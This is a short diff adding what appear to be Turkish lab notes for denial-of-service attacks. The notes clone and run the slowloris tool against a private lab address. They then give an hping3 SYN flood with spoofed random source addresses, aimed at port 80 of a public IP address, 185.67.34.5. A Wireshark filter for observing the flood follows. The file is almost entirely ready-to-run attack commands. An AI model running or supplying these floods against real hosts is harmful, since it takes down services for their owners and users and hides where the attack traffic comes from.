@@ -1,0 +1,27 @@
+git clone https://github.com/gkbrk/slowloris 
+
+service apache2 start 
+
+service apache2 status
+
+ifconfig 
+
+cd slowloris
+
+ls
+  
+slowloris.py 192.168.163.130 -s 500       ( CTRL+C exit)
+
+
+=================|
+hping3 Saldırısı
+=================|
+
+cd slowloris
+
+hping3 -h
+
+sudo hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 185.67.34.5
+
+wireshark open --> tcp.flags.syn == 1 and tcp.flags.ack
+
